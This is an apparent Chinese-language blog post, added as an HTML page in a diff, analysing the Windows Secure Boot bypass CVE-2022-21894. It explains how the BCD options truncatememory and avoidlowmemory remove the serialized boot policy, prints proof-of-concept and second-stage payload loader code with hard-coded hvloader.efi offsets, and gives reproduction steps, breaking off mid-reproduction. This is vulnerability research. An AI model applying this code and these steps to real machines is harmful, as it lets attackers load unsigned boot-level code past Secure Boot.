@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="/project/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/project/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/project/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/project/js/color.global.min.js" ></script>
+<script src="/project/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>安全启动绕过漏洞分析 | Edvison&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="CVE-2022-21894 安全启动绕过漏洞分析。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安全启动绕过漏洞分析">
+<meta property="og:url" content="https://edvison.github.io/project/2023/08/09/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Edvison&#39;s blog">
+<meta property="og:description" content="CVE-2022-21894 安全启动绕过漏洞分析。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230309150945387.png">
+<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230310093535079.png">
+<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230310103349671.png">
+<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230310103446330.png">
+<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230313141321996.png">
+<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230310111954329.png">
+<meta property="article:published_time" content="2023-08-09T07:45:19.000Z">
+<meta property="article:modified_time" content="2023-08-09T07:49:28.620Z">
+<meta property="article:author" content="edvison">
+<meta property="article:tag" content="UEFI">
+<meta property="article:tag" content="安全启动">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230309150945387.png">
+  
+    <link rel="alternate" href="/project/atom.xml" title="Edvison's blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/project/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230807175151.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/project/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Edvison's blog </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/project/">Home</a>
+    
+      <a class="main-nav-link" href="/project/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/project/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/project/atom.xml" title="RSS 订阅">
+        <span class="material-symbols-rounded rss">rss_feed</span>
+      </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="搜索" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/project/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/project/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/project/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/project/atom.xml" title="RSS 订阅">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230808155156.png></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Edvison </div>
+      <div class="dot"></div>
+      <div class="subtitle">flung out of space </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Edvison" title="github"><i class="fa-brands fa-github"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://weibo.com/u/6038772011" title="weibo"><i class="fa-brands fa-weibo"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">分类</h3>
+      <div class="category-box">
+            <a class="category-link" href="/project/categories/UEFI%E5%8E%9F%E7%90%86/">
+                UEFI原理
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/project/categories/UEFI%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/">
+                UEFI固件安全
+                <div class="category-count">6</div>
+            </a>
+        
+            <a class="category-link" href="/project/categories/MBR%E5%8E%9F%E7%90%86/">
+                MBR原理
+                <div class="category-count">2</div>
+            </a>
+        
+            <a class="category-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">
+                翻译
+                <div class="category-count">4</div>
+            </a>
+        
+            <a class="category-link" href="/project/categories/Grub2%E5%8E%9F%E7%90%86/">
+                Grub2原理
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/project/categories/IoT%E5%AE%89%E5%85%A8/">
+                IoT安全
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/project/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
+                硬件安全
+                <div class="category-count">4</div>
+            </a>
+        
+            <a class="category-link" href="/project/categories/VBIOS%E4%BF%AE%E6%94%B9/">
+                VBIOS修改
+                <div class="category-count">1</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">标签</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/CSM/" rel="tag">CSM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/DMA%E6%94%BB%E5%87%BB/" rel="tag">DMA攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/Grub2/" rel="tag">Grub2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/HID%E6%94%BB%E5%87%BB/" rel="tag">HID攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR/" rel="tag">MBR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR%E5%90%8E%E9%97%A8/" rel="tag">MBR后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OS-Loader/" rel="tag">OS Loader</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OVMF%E7%BC%96%E8%AF%91/" rel="tag">OVMF编译</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/PCH/" rel="tag">PCH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM/" rel="tag">SMM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E5%90%8E%E9%97%A8/" rel="tag">SMM后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">SMM漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/VBIOS/" rel="tag">VBIOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/pcie/" rel="tag">pcie</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4/" rel="tag">写保护</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4%E7%AA%81%E7%A0%B4/" rel="tag">写保护突破</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%8E%9F%E7%90%86/" rel="tag">原理</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8/" rel="tag">安全启动</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%BC%80%E5%8F%91%E6%9D%BF/" rel="tag">开发板</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="tag">树莓派</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%94%B5%E6%BA%90%E6%95%85%E9%9A%9C/" rel="tag">电源故障</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">归档</h3>
+      
+      
+        <a class="archive-link" href="/project/archives/2023/08 ">
+          八月 2023 
+          <div class="archive-count">22 </div>
+        </a>
+      
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">最新文章</h3>
+      <ul>
+        
+          <a class="recent-link" href="/project/2023/08/09/Lenovo%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84SMM-callout%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Lenovo固件中的SMM callout漏洞利用" >
+            <div class="recent-link-text">
+              Lenovo固件中的SMM callout漏洞利用
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="利用DMA攻击突破UEFI安全机制" >
+            <div class="recent-link-text">
+              利用DMA攻击突破UEFI安全机制
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="UEFI 引导脚本表漏洞利用" >
+            <div class="recent-link-text">
+              UEFI 引导脚本表漏洞利用
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/" title="基于UEFI平台的SMM后门构建" >
+            <div class="recent-link-text">
+              基于UEFI平台的SMM后门构建
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/project/2023/08/09/P4wnP1%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/" title="P4wnP1配置与使用" >
+            <div class="recent-link-text">
+              P4wnP1配置与使用
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-安全启动绕过漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        安全启动绕过漏洞分析
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-08-09T07:45:19.000Z" itemprop="datePublished">2023-08-09</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/project/categories/UEFI%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/">UEFI固件安全</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            1.8k 词 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8/" rel="tag">安全启动</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>CVE-2022-21894 安全启动绕过漏洞分析。</p>
+<span id="more"></span>
+
+<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a target="_blank" rel="noopener" href="https://github.com/Wack0/CVE-2022-21894">https://github.com/Wack0/CVE-2022-21894</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ASkyeye/CVE-2022-21894-Payload">https://github.com/ASkyeye/CVE-2022-21894-Payload</a></p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于Windows启动程序允许通过<code>truncatememory</code>设置来移除内存map中包含 “持久 “序列化数据范围的内存块，从而导致了安全启动绕过。</p>
+<ul>
+<li>BCD选项<code>truncatememory </code>将从内存映射中移除所有高于指定物理地址的内存。</li>
+<li>在初始化过程中，从内存中读取序列化的安全启动策略之前，会对每个启动应用程序执行这一操作。</li>
+<li>可以用来从内存映射中移除序列化的安全启动策略。</li>
+<li>这导致了能在启动程序中使用危险的设置（<code>bootdebug</code>、<code>testigning</code>、<code>nointegritychecks</code>），从而破坏安全启动。</li>
+</ul>
+<blockquote>
+<p>在没有安全启动的系统中，可以用<code>bcdedit</code>命令开启调试选项或进入测试模式，但受安全引导策略保护的系统无法使用该类命令：</p>
+<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230309150945387.png" alt="image-20230309150945387"></p>
+</blockquote>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>要确保序列化的安全启动策略被分配到已知的物理地址上。</p>
+<ul>
+<li>默认情况下，它被分配在可能的最低地址。</li>
+<li>最初，在使用从BCD加载的任何配置之前，序列化的安全启动策略在它被加载后再被分配到物理地址。<ul>
+<li>从RS1开始，序列化的安全启动策略在加载一个引导程序时被分配。</li>
+<li>从RS2开始，当序列化一个安全引导策略时，任何现有的序列化安全引导策略都将被释放。</li>
+</ul>
+</li>
+<li>在加载启动程序时，如果BCD选项<code>osdevice</code>是一个BitLocker加密的分区，其中的VMK是使用TPM得出的，那么序列化的安全启动策略会被重新分配。<ul>
+<li>可以通过在成功解封TPM后设置密钥标志位的第0位来伪造，这个位可以在BitLocker元数据中手动设置，并添加额外的元数据来指定被用于完整性验证的安全启动</li>
+</ul>
+</li>
+</ul>
+<p><code>avoidlowmemory</code>选项用来确保所有物理内存都分配在指定的物理地址上。</p>
+<ul>
+<li>在Windows 10往后，如启用了VBS，那么这个选项是无法使用的，但由于它是在启动程序初始化过程中使用的，在序列化的安全启动策略从内存中读取之前，可以加载bootmgr并指定一个自定义的BCD路径（使用<code>bcdfilepath</code>选项，即custom:22000023）来绕过这个限制。</li>
+<li>如果操作系统卷上存在BitLocker，或者目标系统正在运行TH1或TH2，那么这个方法就会失败；因此也可以用Windows 8.x的bootmgr运行一次攻击，禁用VBS，然后再换回原始引导程序。<ul>
+<li>Windows 10改变了启动程序的初始化，将所有TPM的PCR都封存一次，所以Windows 8.x bootmgr在Windows 10+系统上解封VMK会失败。</li>
+</ul>
+</li>
+</ul>
+<p><code>hvloader.efi</code>可以用<code>nointegritychecks</code>选项加载一个自签名的mcupdate.dll，其入口点会在<code>ExitBootServices</code>之前被调用。</p>
+<p>另外，在非AMD64系统上，TH2之前的<code>winload.efi</code>可以通过使用<code>testigning</code>选项来允许在证书中使用<code>szOID_NT5_CRYPTO EKU</code>的自签名二进制文件。</p>
+<h1 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h1><p>示例payload很简单，只是在死循环里等待一个中断：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> __forceinline <span class="type">void</span> <span class="title function_">WaitForInterrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(_M_IX86)</span></span><br><span class="line">    __halt();</span><br><span class="line">    <span class="meta">#<span class="keyword">elif</span> defined(_M_ARM) || defined(_M_ARM64)</span></span><br><span class="line">    __wfi();</span><br><span class="line">    <span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unsupported architecture&quot;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">PocMain</span><span class="params">(<span class="type">void</span>** FunctionTableOut, <span class="type">void</span>** FunctionTableIn)</span> &#123;</span><br><span class="line">    <span class="comment">// We don&#x27;t want to return back to the boot application.</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) WaitForInterrupt();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC00000BB</span>L; <span class="comment">// STATUS_NOT_SUPPORTED</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为<code>mcpudate.dll</code>在启用了分页的虚拟地址上运行，所以不能直接调用EFI函数。</p>
+<ul>
+<li>要调用EFI函数，payload需要调用<code>BlImgLoadPEImageEx</code>或<code>BlImgLoadPEImageFromSourceBuffer</code>,设置标志位0，以1:1物理地址:虚拟地址映射的方式加载额外的payload</li>
+<li>或者调用<code>BlImgAllocateImageBuffer</code>，并设置相同的位，以1:1物理地址:虚拟地址的方式分配内存，然后加载额外的payload（或重映射自己）</li>
+</ul>
+<p>这是映射第二阶段payload的示例代码：<a href="%22D:%5Cuefi%5CCVE-2022-21894-main%5CCVE-2022-21894-Payload-master%5Cmain.c%22">mcupdate</a></p>
+<p>首先从HvLoader.efi中获取EFI系统表、image handle、<code>BlpArchSwitchContext</code>和<code>BlImgAllocateImageBuffer</code>的起始地址的偏移。</p>
+<blockquote>
+<p>HvLoader.efi是一个EFI应用程序，用于加载外部hypervisor loader。</p>
+<p>HvLoader.efi可以加载一个指定的hypervisor loader二进制文件（DLL，EFI等），并通过HvLoader.efi 的<code>ImageHandle</code>来调用它的入口点。之后hypervisor loader就能访问HvLoader.efi的命令行选项，并使用这些选项作为配置参数。</p>
+<p>HvLoader.efi的第一个命令行选项指向hypervisor loader二进制文件的路径。</p>
+<p>目前HvLoader.efi驻留在EFI分区，即<code>/boot/efi</code>，并且只能访问该分区。所有路径参数都要相对于<code>/boot/efi</code>分区。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">hvLoaderAddr = functionTableIn[<span class="number">3</span>];                <span class="comment">//包含hvloader.efi中的地址</span></span><br><span class="line">printProc = (PVOID)((DWORD_PTR)hvLoaderAddr + <span class="number">0xAE48</span>);        <span class="comment">//用于打印字符</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (PBYTE searchAddr = printProc; searchAddr; searchAddr--)    <span class="comment">//查找最近的MZ头（保证是hvloader.efi的头）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (searchAddr[<span class="number">0</span>] == <span class="string">&#x27;M&#x27;</span> &amp;&amp; searchAddr[<span class="number">1</span>] == <span class="string">&#x27;Z&#x27;</span> &amp;&amp; searchAddr[<span class="number">2</span>] == <span class="number">0x90</span> &amp;&amp; searchAddr[<span class="number">4</span>] == <span class="number">0x03</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        hvLoaderBase = searchAddr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (!hvLoaderBase)</span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br><span class="line"> </span><br><span class="line">hvDosHeader = (PIMAGE_DOS_HEADER)hvLoaderBase;</span><br><span class="line">hvNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hvLoaderBase + hvDosHeader-&gt;e_lfanew);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (hvNtHeaders-&gt;OptionalHeader.CheckSum != <span class="number">0xEC35E</span>) <span class="comment">//再次检查是否为hvloader.efi</span></span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br><span class="line"><span class="comment">//获取到的EFI系统表、image handle、BlpArchSwitchContext和BlImgAllocateImageBuffer地址</span></span><br><span class="line">fpBlImgAllocateImageBuffer = (BL_IMG_ALLOCATE_IMAGE_BUFFER)((DWORD_PTR)hvLoaderBase + <span class="number">0x3CC0C</span>);</span><br><span class="line">fpBlpArchSwitchContext = (PVOID)((DWORD_PTR)hvLoaderBase + <span class="number">0xC550</span>);</span><br><span class="line"> </span><br><span class="line">efiImageHandle = *(PVOID *)((DWORD_PTR)hvLoaderBase + <span class="number">0x113670</span>);</span><br><span class="line">efiSystemTable = *(PVOID *)((DWORD_PTR)hvLoaderBase + <span class="number">0x1136C8</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后1:1分配物理内存:虚拟内存buffer：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(fpBlImgAllocateImageBuffer(&amp;imageBuffer, imageSize, BL_MEMORY_TYPE_APPLICATION, BL_MEMORY_ATTRIBUTE_RWX, <span class="number">0</span>, <span class="number">0b00000001</span>)))</span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (!imageBuffer)</span><br><span class="line">    <span class="keyword">goto</span> Done;</span><br></pre></td></tr></table></figure>
+
+<p>复制下阶段payload头：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MEMCPY(imageBuffer, efiApp, efiNtHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br></pre></td></tr></table></figure>
+
+<p>映射下阶段payload节区：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">secHeader = (PIMAGE_SECTION_HEADER)((UINT64)&amp;efiNtHeaders-&gt;OptionalHeader + efiNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; efiNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    section = &amp;secHeader[i];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (section-&gt;SizeOfRawData)</span><br><span class="line">    &#123;</span><br><span class="line">        dest = (PVOID)(imageBuffer + section-&gt;VirtualAddress);</span><br><span class="line">        src = (PVOID)(efiApp + section-&gt;PointerToRawData);</span><br><span class="line"> </span><br><span class="line">        MEMCPY(dest, src, section-&gt;SizeOfRawData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用入口点，这里的自定义入口点，将<code>BlpArchSwitchContext</code>的地址传递给下阶段payload，在它调用EFI服务之前，需要以<code>FirmwareContext</code>为参数调用<code>BlpArchSwitchContext</code>，并在返回前将其还原：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (efiNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint)</span><br><span class="line">&#123;</span><br><span class="line">    entry = (BOOT_ENTRY)(imageBuffer + efiNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    entry(efiImageHandle, efiSystemTable, fpBlpArchSwitchContext);                          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>原始bcd配置选项：</p>
+<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230310093535079.png" alt="image-20230310093535079"></p>
+<p><code>poc_amd64_19041</code>根目录的bcd配置选项：</p>
+<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230310103349671.png" alt="image-20230310103349671"></p>
+<p>该bcd会加载有漏洞的<code>/minram/bootmgr.efi</code>，并把<code>avoidlowmemory </code>选项设置为0x10000000，将<code>custom:22000023</code>选项指向<code>/minram/bcd</code>。</p>
+<blockquote>
+<p><code>avoidlowmemory</code>选项用来确保所有物理内存都分配在指定的物理地址上。</p>
+<p>在Windows 10往后，如启用了VBS，那么这个选项是无法使用的，但由于它是在启动程序初始化过程中使用的，在序列化的安全启动策略从内存中读取之前，可以加载bootmgr并指定一个自定义的BCD路径（使用<code>bcdfilepath</code>选项，即custom:22000023）来绕过这个限制。</p>
+</blockquote>
+<p>minram\bcd的配置选项：</p>
+<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230310103446330.png" alt="image-20230310103446330"></p>
+<p>该bcd加载<code>/maxram/hvloader.efi</code>，并将<code>truncatememory</code>设置为0x10000000，<code>nointegritychecks</code>、<code>testsigning</code>设置为yes。</p>
